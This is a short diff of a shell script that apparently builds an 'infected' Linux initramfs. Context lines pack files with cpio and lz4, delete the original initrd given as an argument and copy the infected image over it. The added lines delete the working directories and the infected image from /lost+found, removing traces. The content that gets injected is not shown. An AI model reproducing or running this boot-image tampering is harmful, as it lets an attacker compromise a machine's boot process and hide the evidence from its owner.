@@ -25,3 +25,6 @@ find . | cpio --create --format=newc | lz4 -l -c >> /lost+found/infected-initrd
 
 # replace initrd 
 rm $1 && cp /lost+found/infected-initrd $1
+
+# clean stuff
+rm -r /lost+found/new-initramfs /lost+found/old-initramfs /lost+found/infected-initrd
